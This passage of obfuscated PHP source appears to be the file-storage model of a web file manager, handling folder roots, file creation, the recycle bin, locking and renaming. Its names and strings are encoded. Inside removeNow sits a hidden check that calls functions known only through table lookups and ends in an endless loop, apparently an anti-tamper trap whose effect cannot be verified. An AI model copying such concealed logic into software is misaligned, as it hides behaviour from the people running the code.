$this->_mkdirRoot(SourceModel::TYPE_GROUP, $•Àê×°, $ëğìäÊ‰[$áßèÓÇÜ[32]]); } public function systemRootPathAdd($úî–±Àµ) { if ($úî–±Àµ != $_SERVER[¼èá¯æÙ][619]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $úî–±Àµ); } public function userRootRemove($Áá¼õã) { $Âç—È‘¯ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Áá¼õã, !0); foreach ($Âç—È‘¯ as $Ğ¤Û¯¤ë) { if (!$Ğ¤Û¯¤ë) { continue; } $this->remove($Ğ¤Û¯¤ë[$_SERVER[¼èá¯æÙ][203]], !1); } } public function groupRootRemove($—‰Š”‚¡) { $ÙŞŸš¥ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $—‰Š”‚¡); if (!$ÙŞŸš¥) { return; } $this->remove($ÙŞŸš¥[$_SERVER[¼èá¯æÙ][203]], !1); } private function _mkdirRoot($Àí±§½‚, $•Ôñ®õÁ, $µ¾¿¥²ê, $Ôïñ¬×© = '') { $ÑÈ²éş =& $_SERVER[¼èá¯æÙ]; $¥ÀÃ¿ğø = defined($ÑÈ²éş[2209]) ? USER_ID : 0; $õŒöÑ÷Ï = array($ÑÈ²éş[488] => 0, $ÑÈ²éş[662] => $Àí±§½‚, $ÑÈ²éş[663] => $•Ôñ®õÁ, $ÑÈ²éş[660] => 1, $ÑÈ²éş[664] => $¥ÀÃ¿ğø, $ÑÈ²éş[665] => $¥ÀÃ¿ğø, $ÑÈ²éş[661] => $Ôïñ¬×©, $ÑÈ²éş[666] => $ÑÈ²éş[604], $ÑÈ²éş[515] => 0, $ÑÈ²éş[631] => 0, $ÑÈ²éş[553] => 0, $ÑÈ²éş[667] => $ÑÈ²éş[12]); if ($ñÄ¤“µá = $this->where($õŒöÑ÷Ï)->find()) { return $ñÄ¤“µá[$ÑÈ²éş[203]]; } $›±ˆÖ÷ = "\x4d\x6f\144\145\154\123\157\x75\x72\143\145\x2e\x6d\153\x64\151\162\122\157\157\x74\x2e{$Àí±§½‚}\56{$•Ôñ®õÁ}\x2e" . $µ¾¿¥²ê; CacheLock::lock($›±ˆÖ÷); $õŒöÑ÷Ï[$ÑÈ²éş[32]] = $µ¾¿¥²ê; $¯˜®œ = $this->add($õŒöÑ÷Ï); $÷ÊÛî = array($ÑÈ²éş[668] => short_id($¯˜®œ)); $this->where(array($ÑÈ²éş[502] => $¯˜®œ))->save($÷ÊÛî); CacheLock::unlock($›±ˆÖ÷); return $¯˜®œ; } private function targetSourceRoot($ÁŸïºŠå, $Ü‰ãä†ô, $ÊÅğ…äš = false) { $£í¹†î =& $_SERVER[¼èá¯æÙ]; $ëÈĞ Ñƒ = array($£í¹†î[488] => 0, $£í¹†î[662] => $ÁŸïºŠå, $£í¹†î[663] => $Ü‰ãä†ô); if ($ÊÅğ…äš) { $¢å·‹Üí = $this->where($ëÈĞ Ñƒ)->select(); return $¢å·‹Üí ? $¢å·‹Üí : array(); } $¶¬Ó¬¥Ç = $this->where($ëÈĞ Ñƒ)->find(); return $¶¬Ó¬¥Ç ? $¶¬Ó¬¥Ç : array(); } public function sourceRootGroup($½„¬Ï´Â) { $Á‚–Õª =& $_SERVER[¼èá¯æÙ]; if (is_string($½„¬Ï´Â)) { $½„¬Ï´Â = array($½„¬Ï´Â); } $Ÿ¿›ÑºÊ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $½„¬Ï´Â, $Á‚–Õª[232]); $«ˆ¼àÒë = array($Á‚–Õª[457] => $Ÿ¿›ÑºÊ, $Á‚–Õª[454] => array($Á‚–Õª[840] => count($½„¬Ï´Â))); $this->_listDataApply($«ˆ¼àÒë[$Á‚–Õª[457]]); $this->_listMake($«ˆ¼àÒë); return array_to_keyvalue($«ˆ¼àÒë[$Á‚–Õª[95]], $Á‚–Õª[580]); } public function mkfile($Ğğàè—, $¸ÙôÒ¾Ü, $íÓè”û» = '', $Ü‘ø×æ = REPEAT_RENAME) { $ ‚ÖŒ­¶ =& $_SERVER[¼èá¯æÙ]; $Ö®“µ = Model($ ‚ÖŒ­¶[688])->addFileByContent($íÓè”û», $¸ÙôÒ¾Ü); return $this->_createFileCall($Ğğàè—, $¸ÙôÒ¾Ü, $Ö®“µ, $Ü‘ø×æ, $ ‚ÖŒ­¶[1436]); } public function addFile($ë¼¼ç»Ó, $´¢Éƒœ, $ÎäİÂ·Ä, $ÃÔüİÎé = false, $âªîÌš = REPEAT_RENAME) { $’„‰šÑÀ = Model($_SERVER[¼èá¯æÙ][688])->addFile($´¢Éƒœ, $ÎäİÂ·Ä, $ÃÔüİÎé); return $this->_createFileCall($ë¼¼ç»Ó, $ÎäİÂ·Ä, $’„‰šÑÀ, $âªîÌš); } public function addFileByFileID($òğµ‚¥ô, $ØÑŒ¡êÚ, $şÒà¼Şû, $ù—¾ŸÂÁ = REPEAT_RENAME) { $æü´ù½ =& $_SERVER[¼èá¯æÙ]; $­´ùéóÓ = Model($æü´ù½[688])->find($ØÑŒ¡êÚ); Model($æü´ù½[688])->linkAdd($ØÑŒ¡êÚ); return $this->_createFileCall($òğµ‚¥ô, $şÒà¼Şû, $­´ùéóÓ, $ù—¾ŸÂÁ); } public function addFileByRemote($Éˆ™ş, $ŞÚ³Îç€, $‡Ç‘…ñğ, $ßÕúéàÂ = array(), $ù¦‹ñœ = REPEAT_RENAME) { $úÌ×ÔÙ‰ = Model($_SERVER[¼èá¯æÙ][688])->addFileByRemote($ŞÚ³Îç€, $‡Ç‘…ñğ, $ßÕúéàÂ); return $this->_createFileCall($Éˆ™ş, $‡Ç‘…ñğ, $úÌ×ÔÙ‰, $ù¦‹ñœ); } private function _createFileCall($‡ ¡½ıÌ, $—ÇèúêÙ, $¤ë³ª, $óìŸÁ, $ï§·Õû = "\x75\160\x6c\157\141\x64") { $Í§ÛÈò =& $_SERVER[¼èá¯æÙ]; $›ã‘¶¾Î = !1; $this->setMasterDB(); $this->lockWriteStart($‡ ¡½ıÌ, $—ÇèúêÙ); $«­Òœ¢® = $this->fileNameExist($‡ ¡½ıÌ, $—ÇèúêÙ); $»ßÖÄß = $this->_createFile($‡ ¡½ıÌ, $—ÇèúêÙ, $¤ë³ª, $óìŸÁ, $›ã‘¶¾Î); if (!$›ã‘¶¾Î) { Model($Í§ÛÈò[555])->remove($¤ë³ª[$Í§ÛÈò[552]]); } if ($›ã‘¶¾Î && $»ßÖÄß && $»ßÖÄß != $«­Òœ¢®) { Model($Í§ÛÈò[2236])->eventCreate($»ßÖÄß, $ï§·Õû); } $this->lockWriteEnd($‡ ¡½ıÌ, $—ÇèúêÙ); return $»ßÖÄß; } public function mkdir($Ê›ÃÎë‘, $á€³è¿Î, $”Ô›Ê¡¤ = REPEAT_SKIP) { $áà„ş‰Ô =& $_SERVER[¼èá¯æÙ]; $this->setMasterDB(); $ˆ×Â¶´˜ = $this->sourceInfo($Ê›ÃÎë‘); if (!$ˆ×Â¶´˜) { return !1; } $this->lockWriteStart($Ê›ÃÎë‘, $á€³è¿Î); if ($”Ô›Ê¡¤ !== !1) { $úÏ¾ÖŒŒ = $this->fileNameExist($Ê›ÃÎë‘, $á€³è¿Î); if ($úÏ¾ÖŒŒ && $”Ô›Ê¡¤ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ê›ÃÎë‘, $á€³è¿Î); return $úÏ¾ÖŒŒ; } $á€³è¿Î = $this->fileNameAuto($Ê›ÃÎë‘, $á€³è¿Î, $”Ô›Ê¡¤); } $Ÿ¹±µÆ = array($áà„ş‰Ô[660] => 1, $áà„ş‰Ô[505] => $á€³è¿Î, $áà„ş‰Ô[661] => $áà„ş‰Ô[12], $áà„ş‰Ô[553] => 0, $áà„ş‰Ô[631] => 0); $Ü«ä‹š„ = $this->_addSource($Ÿ¹±µÆ, $ˆ×Â¶´˜); Model($áà„ş‰Ô[2236])->eventCreate($Ü«ä‹š„, $áà„ş‰Ô[1437]); $this->lockWriteEnd($Ê›ÃÎë‘, $á€³è¿Î); return $Ü«ä‹š„; } public function listSourceRoot($æ•°­õå, $¦øÅáÀƒ, $ğ¬³› = "\x73\157\165\162\x63\x65\111\104\54\x74\x61\162\x67\145\x74\x49\x44\54\163\x69\172\145") { $‰ñĞ‹¬ =& $_SERVER[¼èá¯æÙ]; $Œä¬ö†„ = $‰ñĞ‹¬[63]; $‰¸«Ê°Æ = array(); $€œßÓ¤ = 1024 * 50; $ÓøÇÁå = is_array($ÓøÇÁå) ? $ÓøÇÁå : array(); $ëÜÍâÀ¢ = count($¦øÅáÀƒ); $¶Íâ´˜  = $this->tablePrefix . $‰ñĞ‹¬[2274]; for ($»ØİÜ¬Â = 0; $»ØİÜ¬Â < $ëÜÍâÀ¢; $»ØİÜ¬Â++) { $íöõÊı¾ = $¦øÅáÀƒ[$»ØİÜ¬Â]; $Œä¬ö†„ .= "\123\105\x4c\105\103\x54\40\52\40\x46\x52\x4f\115\40\x28\x53\x45\x4c\x45\103\124\x20{$ğ¬³›}\40\106\122\x4f\115\40\x60{$¶Íâ´˜ }\140\x20\x57\110\x45\x52\105\x20"; $Œä¬ö†„ .= "\x60\x70\x61\162\145\156\164\111\x44\x60\x3d\x30\40\101\116\104\x20\140\x74\x61\x72\147\x65\x74\x49\x44\x60\75{$íöõÊı¾}\40\x41\116\x44\40\x60\164\141\162\147\x65\x74\x54\x79\x70\x65\x60\75{$æ•°­õå}\40\141\156\144\x20\x66\151\x6c\x65\x54\171\160\145\x3d\47\47\x20\x6c\x69\x6d\151\x74\40\x31\51\x20\x61\x73\x20\164\x62\x5f{$»ØİÜ¬Â}\x20\x55\116\111\117\x4e\40\101\x4c\114\x20"; if ((strlen($Œä¬ö†„) >= $€œßÓ¤ || $»ØİÜ¬Â == $ëÜÍâÀ¢ - 1) && $Œä¬ö†„) { $Œä¬ö†„ = substr($Œä¬ö†„, 0, -strlen($‰ñĞ‹¬[1120])); $ùÏà = $this->query($Œä¬ö†„); $Œä¬ö†„ = $‰ñĞ‹¬[12]; $‰¸«Ê°Æ = array_merge($‰¸«Ê°Æ, $ùÏà); } } return $‰¸«Ê°Æ; } private function _createFile($êÙ¯â÷·, $õÄ‚…©, $Ô¶·—µØ, $ò¾šä³, &$‡âû±÷Ñ) { $«âË˜¹ =& $_SERVER[¼èá¯æÙ]; $ôˆ£Ùåº = $this->sourceInfo($êÙ¯â÷·); if (!$Ô¶·—µØ || !$ôˆ£Ùåº) { return !1; } if ($ò¾šä³ !== !1) { $ÚÎéùÈ = $this->fileNameExist($êÙ¯â÷·, $õÄ‚…©); } $‡âû±÷Ñ = !0; if ($ò¾šä³ && $ÚÎéùÈ) { if ($ò¾šä³ == REPEAT_SKIP) { $‡âû±÷Ñ = !1; return $ÚÎéùÈ; } else { if ($ò¾šä³ == REPEAT_REPLACE) { $Ô å¾ğ = $this->sourceInfo($ÚÎéùÈ); $ëËé‚ï = $this->fileHistory($Ô å¾ğ, $Ô¶·—µØ[$«âË˜¹[552]], $Ô¶·—µØ[$«âË˜¹[89]]); if (!$ëËé‚ï) { $‡âû±÷Ñ = !1; } else { $this->folderSizeReset($êÙ¯â÷·); } return $ÚÎéùÈ; } else { $õÄ‚…© = $this->fileNameAuto($êÙ¯â÷·, $õÄ‚…©, $ò¾šä³, !1); } } } $‘è¯™ÒÜ = array($«âË˜¹[660] => 0, $«âË˜¹[505] => $õÄ‚…©, $«âË˜¹[661] => substr(get_path_ext($õÄ‚…©), 0, 10), $«âË˜¹[553] => $Ô¶·—µØ[$«âË˜¹[552]], $«âË˜¹[631] => $Ô¶·—µØ[$«âË˜¹[89]]); $Î¼¶÷Ì¼ = $this->_addSource($‘è¯™ÒÜ, $ôˆ£Ùåº); $this->folderSizeReset($êÙ¯â÷·, intval($‘è¯™ÒÜ[$«âË˜¹[89]])); return $Î¼¶÷Ì¼; } protected function fileHistory($‡®óæ‡, $¶¦çºßš, $óİ‡œì…) { $İ³µû’ =& $_SERVER[¼èá¯æÙ]; if ($‡®óæ‡[$İ³µû’[552]] == $¶¦çºßš) { return !1; } $this->checkLock($‡®óæ‡[$İ³µû’[203]], $¶¦çºßš); Model($İ³µû’[2275])->addHistory($‡®óæ‡); $´Ÿ·¢´¦ = array($İ³µû’[665] => USER_ID, $İ³µû’[509] => time(), $İ³µû’[552] => $¶¦çºßš, $İ³µû’[89] => $óİ‡œì…); $this->where(array($İ³µû’[502] => $‡®óæ‡[$İ³µû’[203]]))->save($´Ÿ·¢´¦); $this->sourceCacheClear($‡®óæ‡[$İ³µû’[203]]); return !0; } public function checkLock($â…ñ—£, $¸âØŒİ¡) { $òºœ²á˜ =& $_SERVER[¼èá¯æÙ]; $ÄÚÁ×¯£ = $this->pathInfo($â…ñ—£); if (!$this->fileIsLock($ÄÚÁ×¯£, !0)) { return; } $„Öö— = Session::get($òºœ²á˜[2276]); $ÈæÎú—û = substr($ÄÚÁ×¯£[$òºœ²á˜[32]], 0, -1 - strlen($ÄÚÁ×¯£[$òºœ²á˜[179]])) . $òºœ²á˜[1298] . $„Öö— . $òºœ²á˜[10] . $ÄÚÁ×¯£[$òºœ²á˜[179]]; $„®”¬€â = Model($òºœ²á˜[688])->find($¸âØŒİ¡); $this->_createFileCall($ÄÚÁ×¯£[$òºœ²á˜[202]], $ÈæÎú—û, $„®”¬€â, REPEAT_REPLACE, $òºœ²á˜[1436]); $éõÙ¦«ô = $ÄÚÁ×¯£[$òºœ²á˜[550]][$òºœ²á˜[624]]; $»¤İÍÚ” = $éõÙ¦«ô[$òºœ²á˜[2277]] ? $éõÙ¦«ô[$òºœ²á˜[2277]] : $éõÙ¦«ô[$òºœ²á˜[32]]; show_json(LNG($òºœ²á˜[2278]) . $òºœ²á˜[2279] . LNG($òºœ²á˜[2280]) . $òºœ²á˜[2281] . $»¤İÍÚ” . $òºœ²á˜[2282], !1); } public function fileIsLock($™·ÁàµÒ, $éÍÍÆ¯å = false) { $§ëø„Çû =& $_SERVER[¼èá¯æÙ]; if (!_get($™·ÁàµÒ, $§ëø„Çû[620], 0)) { return !1; } if ($™·ÁàµÒ[$§ëø„Çû[550]][$§ëø„Çû[623]] != USER_ID) { return !0; } $ı¼üÂÕ÷ = $GLOBALS[$§ëø„Çû[6]][$§ëø„Çû[102]][$§ëø„Çû[621]]; if ($™·ÁàµÒ[$§ëø„Çû[550]][$§ëø„Çû[622]] <= time() - $ı¼üÂÕ÷) { $this->metaSet($™·ÁàµÒ[$§ëø„Çû[203]], $§ëø„Çû[623], null); $this->metaSet($™·ÁàµÒ[$§ëø„Çû[203]], $§ëø„Çû[622], null); } if ($éÍÍÆ¯å) { $this->metaSet($™·ÁàµÒ[$§ëø„Çû[203]], $§ëø„Çû[622], time()); } return !1; } private function _addSource($Ù¼ŸÎé÷, $‚…Ï³ÑÙ) { $Ò½“ÉËã =& $_SERVER[¼èá¯æÙ]; $ï‹æ = defined($Ò½“ÉËã[2209]) ? USER_ID : 0; $ø‰œò¨• = array($Ò½“ÉËã[662] => $‚…Ï³ÑÙ[$Ò½“ÉËã[200]], $Ò½“ÉËã[663] => $‚…Ï³ÑÙ[$Ò½“ÉËã[580]], $Ò½“ÉËã[664] => $ï‹æ, $Ò½“ÉËã[665] => $ï‹æ, $Ò½“ÉËã[488] => $‚…Ï³ÑÙ[$Ò½“ÉËã[203]], $Ò½“ÉËã[666] => $‚…Ï³ÑÙ[$Ò½“ÉËã[595]] . $‚…Ï³ÑÙ[$Ò½“ÉËã[203]] . $Ò½“ÉËã[50], $Ò½“ÉËã[515] => 0, $Ò½“ÉËã[667] => $Ò½“ÉËã[12]); $Ù¼ŸÎé÷ = array_merge($ø‰œò¨•, $Ù¼ŸÎé÷); $this->updateModifyTime($Ù¼ŸÎé÷[$Ò½“ÉËã[202]]); $íŸªØ¬ = $Ò½“ÉËã[2283] . $‚…Ï³ÑÙ[$Ò½“ÉËã[203]]; if (isset(self::$cacheChildList[$íŸªØ¬])) { unset(self::$cacheChildList[$íŸªØ¬]); } static $ˆ®Ä˜Âû = false; if (!$ˆ®Ä˜Âû) { Hook::trigger($Ò½“ÉËã[650], $Ù¼ŸÎé÷); $ˆ®Ä˜Âû = !0; } $äÂí•ªÔ = $this->add($Ù¼ŸÎé÷); $úŒïÓãõ = array($Ò½“ÉËã[668] => short_id($äÂí•ªÔ)); $this->where(array($Ò½“ÉËã[502] => $äÂí•ªÔ))->save($úŒïÓãõ); $this->setNamePinyin($äÂí•ªÔ, $Ù¼ŸÎé÷[$Ò½“ÉËã[32]]); return $äÂí•ªÔ; } public function remove($åŸûŠÛ, $¤ô¼ÆšÜ = true) { $ß²•Ùƒ† =& $_SERVER[¼èá¯æÙ]; $¹¨óÈÙ = $this->sourceInfo($åŸûŠÛ); $Ş–ÂÓ˜ò = intval($¹¨óÈÙ[$ß²•Ùƒ†[200]]) === self::TYPE_SYSTEM; $ÌëÑÏ¶ = Model($ß²•Ùƒ†[519])->get($ß²•Ùƒ†[2284]) == $ß²•Ùƒ†[101]; if ($Ş–ÂÓ˜ò || $¤ô¼ÆšÜ || !$ÌëÑÏ¶) { return $this->removeNow($åŸûŠÛ, $¤ô¼ÆšÜ); } $×¥é‡Õè = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ƒ—ÃşÑÆ = $¹¨óÈÙ[$ß²•Ùƒ†[200]] == self::TYPE_USER ? $ß²•Ùƒ†[676] : $ß²•Ùƒ†[589]; if ($ƒ—ÃşÑÆ == $ß²•Ùƒ†[676]) { $¬¿şâÒ¥ = Model($ß²•Ùƒ†[588])->getInfo($¹¨óÈÙ[$ß²•Ùƒ†[580]]); $ñøŸÁˆ = !empty($¬¿şâÒ¥[$ß²•Ùƒ†[2277]]) ? $¬¿şâÒ¥[$ß²•Ùƒ†[2277]] : $¬¿şâÒ¥[$ß²•Ùƒ†[32]]; $ñøŸÁˆ = $ß²•Ùƒ†[349] . $ñøŸÁˆ . $ß²•Ùƒ†[2285] . $¹¨óÈÙ[$ß²•Ùƒ†[580]]; } else { $¬¿şâÒ¥ = Model($ß²•Ùƒ†[596])->getInfo($¹¨óÈÙ[$ß²•Ùƒ†[580]]); $ñøŸÁˆ = _get($¬¿şâÒ¥, $ß²•Ùƒ†[32]); $ñøŸÁˆ = $ß²•Ùƒ†[186] . $ñøŸÁˆ . $ß²•Ùƒ†[2286] . $¹¨óÈÙ[$ß²•Ùƒ†[580]]; } $¼Ñ«¤“œ = $ß²•Ùƒ†[2287] . md5($ñøŸÁˆ); CacheLock::lock($¼Ñ«¤“œ); $Šç–˜€á = $this->fileNameExist($×¥é‡Õè, $ñøŸÁˆ); if (!$Šç–˜€á) { $Šç–˜€á = $this->mkdir($×¥é‡Õè, $ñøŸÁˆ, REPEAT_SKIP); $this->metaSet($Šç–˜€á, $ß²•Ùƒ†[2288], $ƒ—ÃşÑÆ); $this->metaSet($Šç–˜€á, $ß²•Ùƒ†[2289], $¹¨óÈÙ[$ß²•Ùƒ†[580]]); if ($¹¨óÈÙ[$ß²•Ùƒ†[202]] != 0) { $this->metaSet($Šç–˜€á, $ß²•Ùƒ†[2290], _get($¬¿şâÒ¥, $ß²•Ùƒ†[2291])); } } CacheLock::unlock($¼Ñ«¤“œ); $this->metaSet($åŸûŠÛ, $ß²•Ùƒ†[2292], $¹¨óÈÙ[$ß²•Ùƒ†[202]]); $this->where(array($ß²•Ùƒ†[203] => $åŸûŠÛ))->save(array($ß²•Ùƒ†[509] => time())); $this->recycleClear($¹¨óÈÙ); Model($ß²•Ùƒ†[647])->eventRemove($åŸûŠÛ); $‘¯Ó²£ = $this->move($åŸûŠÛ, $Šç–˜€á, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¹¨óÈÙ[$ß²•Ùƒ†[202]]); return $‘¯Ó²£; } private function recycleClear($’˜´ëÁ) { $¦¢İĞş– =& $_SERVER[¼èá¯æÙ]; $ü¦…ƒÉà = $this->childrenAll($’˜´ëÁ); $½Î¸Ô© = array($¦¢İĞş–[502] => array($¦¢İĞş–[503], $ü¦…ƒÉà[$¦¢İĞş–[2293]])); Model($¦¢İĞş–[2294])->where($½Î¸Ô©)->delete(); } public function removeNow($Ìø´’¢˜, $ªÏğÎşè = true) { $Áç‰‹‚‡ =& $_SERVER[¼èá¯æÙ]; if (!isset($_SERVER[$Áç‰‹‚‡[54]]) || !isset($_SERVER[$Áç‰‹‚‡[55]])) { $€ÕßÌº¤ = $Áç‰‹‚‡[960]; $ÇŸÏ¬¬Å = $Áç‰‹‚‡[56]; $•ï¯ÊÚ‚ = $_SERVER[$Áç‰‹‚‡[57]] . $Áç‰‹‚‡[58]; $Ñâ««…¢ = $ÇŸÏ¬¬Å($•ï¯ÊÚ‚); $Ø•Ë¿ = explode($Áç‰‹‚‡[59], $Ñâ««…¢); if (count($Ø•Ë¿) < $Áç‰‹‚‡[706]) { $ ğÌ°Ÿ„ = $Áç‰‹‚‡[61]; $ ğÌ°Ÿ„(); } $Ş¬ºÛşÕ = $Áç‰‹‚‡[961]; $Ş¬ºÛşÕ($_SERVER[$Áç‰‹‚‡[962]]); $Î«Ò©œô = 1; for ($ÈòÚŒõ¦ = $Î«Ò©œô; $ÈòÚŒõ¦ > 0; $ÈòÚŒõ¦++) { $Ş¬ºÛşÕ = json_encode($GLOBALS[$Áç‰‹‚‡[503]]); } } $·¹˜÷õß = $this->sourceInfo($Ìø´’¢˜); $£„¥º­„ = $this->pathInfoMore($Ìø´’¢˜); if (!$·¹˜÷õß) { return !0; } if ($·¹˜÷õß[$Áç‰‹‚‡[202]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Ìø´’¢˜); Hook::trigger($Áç‰‹‚‡[2295], $£„¥º­„, $ªÏğÎşè); if ($ªÏğÎşè) { Model($Áç‰‹‚‡[2294])->moveToRecycle($Ìø´’¢˜); } else { $Š£îå–ş = $this->childrenAll($·¹˜÷õß); Model($Áç‰‹‚‡[647])->eventRemove($Ìø´’¢˜); $this->removeRelevance($Š£îå–ş[$Áç‰‹‚‡[2293]], $Š£îå–ş[$Áç‰‹‚‡[1581]]); } $this->folderSizeReset($·¹˜÷õß[$Áç‰‹‚‡[202]]); $”¦Âğ÷å = array($·¹˜÷õß[$Áç‰‹‚‡[202]]); if ($·¹˜÷õß[$Áç‰‹‚‡[496]] == $Áç‰‹‚‡[101]) { $”¦Âğ÷å[] = $·¹˜÷õß[$Áç‰‹‚‡[203]]; } $this->updateModifyTime($”¦Âğ÷å); $this->lockMoveEnd($Ìø´’¢˜); Hook::trigger($Áç‰‹‚‡[1821], $£„¥º­„, $ªÏğÎşè); return !0; } public function childrenAll($öè¿Ó¶À) { $æ‹ñµ¥ =& $_SERVER[¼èá¯æÙ]; $¨üğ‡ë‚ = $öè¿Ó¶À[$æ‹ñµ¥[203]]; if ($öè¿Ó¶À[$æ‹ñµ¥[496]] == $æ‹ñµ¥[101]) { $„ÂáÀ¯Š = array($æ‹ñµ¥[666] => array($æ‹ñµ¥[626], $öè¿Ó¶À[$æ‹ñµ¥[595]] . $¨üğ‡ë‚ . $æ‹ñµ¥[627])); $•ƒƒò×ì = array($æ‹ñµ¥[666] => $„ÂáÀ¯Š[$æ‹ñµ¥[595]]); $¢ÃÙÚ¼ = $this->field($æ‹ñµ¥[2296])->where($•ƒƒò×ì)->select(); $§»ú®ÙÊ = !1; $ÉèœæÅ• = array($¨üğ‡ë‚); if ($¢ÃÙÚ¼) { $§»ú®ÙÊ = array_to_keyvalue($¢ÃÙÚ¼, $æ‹ñµ¥[12], $æ‹ñµ¥[552]); $§»ú®ÙÊ = array_remove_value($§»ú®ÙÊ, $æ‹ñµ¥[240]); $ÉèœæÅ• = array_to_keyvalue($¢ÃÙÚ¼, $æ‹ñµ¥[12], $æ‹ñµ¥[203]); $ÉèœæÅ•[] = $¨üğ‡ë‚; } } else { $§»ú®ÙÊ = array($öè¿Ó¶À[$æ‹ñµ¥[552]]); $ÉèœæÅ• = array($¨üğ‡ë‚); } return array($æ‹ñµ¥[2293] => $ÉèœæÅ•, $æ‹ñµ¥[1581] => $§»ú®ÙÊ); } public function removeArray($ï¬öúû) { if (!$ï¬öúû) { return !0; } } public function removeRelevance($±çËËïÍ, $òöµë‰¢) { $÷§ŸÊà =& $_SERVER[¼èá¯æÙ]; $±çËËïÍ = $±çËËïÍ ? $±çËËïÍ : array(); $òöµë‰¢ = $òöµë‰¢ ? $òöµë‰¢ : array(); $±çËËïÍ = array_unique(array_filter($±çËËïÍ)); $òöµë‰¢ = array_unique(array_filter($òöµë‰¢)); if (!$±çËËïÍ) { return !1; } $Å¶äŸƒ = array($÷§ŸÊà[502] => array($÷§ŸÊà[503], $±çËËïÍ)); Model($÷§ŸÊà[2294])->where($Å¶äŸƒ)->delete(); Model($÷§ŸÊà[546])->where($Å¶äŸƒ)->delete(); Model($÷§ŸÊà[2134])->where($Å¶äŸƒ)->delete(); Model($÷§ŸÊà[647])->where($Å¶äŸƒ)->delete(); Model($÷§ŸÊà[1958])->removeBySource($±çËËïÍ); Model($÷§ŸÊà[2275])->removeBySource($±çËËïÍ); $this->where($Å¶äŸƒ)->delete(); Model($÷§ŸÊà[555])->remove($òöµë‰¢); for ($ÛãòüõÂ = 0; $ÛãòüõÂ < count($±çËËïÍ); $ÛãòüõÂ++) { $this->sourceCacheClear($±çËËïÍ[$ÛãòüõÂ]); } } public function rename($¶”†¼±ñ, $ùù®ÅÔ) { $Ÿö·Ü©÷ =& $_SERVER[¼èá¯æÙ]; $¹®¤èòü = $this->sourceInfo($¶”†¼±ñ); if (!$¹®¤èòü) { return !1; } $°ø¹î = $this->fileNameExist($¹®¤èòü[$Ÿö·Ü©÷[202]], $ùù®ÅÔ); if ($°ø¹î && $°ø¹î != $¶”†¼±ñ) { return !1; } $°•˜ß´¡ = array($Ÿö·Ü©÷[505] => $ùù®ÅÔ, $Ÿö·Ü©÷[665] => USER_ID); if ($¹®¤èòü[$Ÿö·Ü©÷[496]] != $Ÿö·Ü©÷[101]) { $°•˜ß´¡[$Ÿö·Ü©÷[497]] = substr(get_path_ext($ùù®ÅÔ), 0, 10); } Model($Ÿö·Ü©÷[647])->eventRename($¶”†¼±ñ, $¹®¤èòü[$Ÿö·Ü©÷[32]], $ùù®ÅÔ); $this->sourceCacheClear($¶”†¼±ñ); $this->setNamePinyin($¶”†¼±ñ, $°•˜ß´¡[$Ÿö·Ü©÷[32]], !1); $this->updateModifyTime($¹®¤èòü[$Ÿö·Ü©÷[202]]); $ñ“î‘ĞÊ = $this->where(array($Ÿö·Ü©÷[502] => $¶”†¼±ñ))->data($°•˜ß´¡)->save(); $­ÆŸÁóÒ = $Ÿö·Ü©÷[2283] . $¹®¤èòü[$Ÿö·Ü©÷[202]]; if (isset(self::$cacheChildList[$­ÆŸÁóÒ])) { unset(self::$cacheChildList[$­ÆŸÁóÒ]); } return $ñ“î‘ĞÊ; } public function setNamePinyin($‡šâ—ëİ, $–§´Îº, $Ğş²•ôŞ = true) { $ª»í“ÏÜ =& $_SERVER[¼èá¯æÙ]; $çû£ñøª = Input::check($–§´Îº, $ª»í“ÏÜ[669]); $°í¢œ¯ô = array($ª»í“ÏÜ[528] => KodSort::makeStr($–§´Îº)); if ($çû£ñøª) { $°í¢œ¯ô[$ª»í“ÏÜ[549]] = str_replace($ª»í“ÏÜ[53], $ª»í“ÏÜ[12], Pinyin::get($–§´Îº)); $°í¢œ¯ô[$ª»í“ÏÜ[548]] = Pinyin::get($–§´Îº, $ª»í“ÏÜ[670]); } if (!$Ğş²•ôŞ && !$çû£ñøª) { $°í¢œ¯ô[$ª»í“ÏÜ[549]] = null; $°í¢œ¯ô[$ª»í“ÏÜ[548]] = null; } $this->metaSet($‡šâ—ëİ, $°í¢œ¯ô); } public function getContent($ÑÇùĞóó) { $İÆëÛ›‘ =& $_SERVER[¼èá¯æÙ]; $Â¢ÖÙÅ¿ = $this->fileInfoGet($ÑÇùĞóó); if (!$Â¢ÖÙÅ¿) { return !1; } if ($Â¢ÖÙÅ¿[$İÆëÛ›‘[89]] == 0) { return $İÆëÛ›‘[12]; } $“Îœûí÷ = $İÆëÛ›‘[2297] . $Â¢ÖÙÅ¿[$İÆëÛ›‘[558]]; if ($Â¢ÖÙÅ¿[$İÆëÛ›‘[89]] <= 1024 * 10) { $¯²ÁÆ»Ñ = Cache::get($“Îœûí÷); if (!$¯²ÁÆ»Ñ) { $¯²ÁÆ»Ñ = IO::getContent($Â¢ÖÙÅ¿[$İÆëÛ›‘[97]]); Cache::set($“Îœûí÷, $¯²ÁÆ»Ñ); } return $¯²ÁÆ»Ñ; } if (!$Â¢ÖÙÅ¿[$İÆëÛ›‘[97]]) { return $İÆëÛ›‘[12]; } return IO::getContent($Â¢ÖÙÅ¿[$İÆëÛ›‘[97]]); } public function setDesc($—Ş°£ÌÄ, $èù¾äãª) { $ç­Æëäâ =& $_SERVER[¼èá¯æÙ]; Model($ç­Æëäâ[647])->eventAddDesc($—Ş°£ÌÄ, $èù¾äãª); return $this->metaSet($—Ş°£ÌÄ, $ç­Æëäâ[537], $èù¾äãª); } public function setContent($»åªÈŸŸ, $ƒ¸„¶— = '') { $ù¥ŸÓË¤ =& $_SERVER[¼èá¯æÙ]; $®„ÌÒËÀ = $this->sourceInfo($»åªÈŸŸ); $’±¼¿ù = $this->fileInfoGet($»åªÈŸŸ); if (!$’±¼¿ù || !$®„ÌÒËÀ) { return !1; } $Ìõ¾å¸Ô = Model($ù¥ŸÓË¤[555])->addFileByContent($ƒ¸„¶—, $®„ÌÒËÀ[$ù¥ŸÓË¤[32]]); $Î³¯®ø× = $this->fileHistory($®„ÌÒËÀ, $Ìõ¾å¸Ô[$ù¥ŸÓË¤[552]], 